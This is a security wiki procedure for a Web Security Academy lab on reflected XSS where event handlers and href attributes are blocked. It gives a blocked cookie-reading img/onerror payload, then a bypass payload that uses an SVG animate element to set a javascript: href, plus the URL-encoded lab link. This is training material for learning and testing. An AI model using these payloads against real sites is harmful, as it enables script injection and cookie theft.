---
id: bb703daa-6708-4072-adcd-67b5d5082d98
name: Reflected XSS with Event Handlers And Href Attributes Blocked
type: procedure
verified: true
submitted: true
created_at: '2020-08-27T07:57:40.198611+00:00'
updated_at: '2023-05-26T18:23:13.338187+00:00'
platforms:
- Web
tags:
- '[[injection]]'
- '[[owasp top 10]]'
- '[[Reflected XSS]]'
- '[[Web Applications]]'
---

# Reflected XSS with Event Handlers And Href Attributes Blocked

**Status**: ✓ Verified

## Summary

Description Some applications block event handlers and href attributes to prevent the execution of JS code . An attacker can bypass the restrictions by creating a button and then upon clicking the button the payload gets executed. Instructions 1. Inject a standard XSS payload such as: <img src=1 on

## Description

Description

Some applications block event handlers and href attributes to prevent the execution of JS code . An attacker can bypass the restrictions by creating a button and then upon clicking the button the payload gets executed.



Instructions





1.` `Inject a standard XSS payload such as: `<img src=1 onerror=alert(document.cookie)>`





![bcb88099-af9e-4a03-b97f-dd6bdbd1dc73.png]()





2. Observe that it gets blocked.









![43e699ea-067f-4766-afec-9aaa72db7bff.png]()







3.1. Now we need to create a text button, which when clicked should pop an alert as event handlers and href attributes are blocked. To do this, use a javascript payload as like:

*<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Click me</text></a>*

Encode it as URL





![1c575171-5f4a-4667-ac97-689fc34d8a70.png]()







4. Visit the foloowing url

[*https://your-lab-id.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3](https://your-lab-id.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E)E*







![3d17cab8-21f1-472a-a356-90abcf8b6f1a.png]()





5.Click on* click me* button to alert a pop up.





![0e4b3a7d-7bec-4155-a3a1-46412885d947.png]()



## Platforms

- Web

## Tags

- [[injection]]
- [[owasp top 10]]
- [[Reflected XSS]]
- [[Web Applications]]


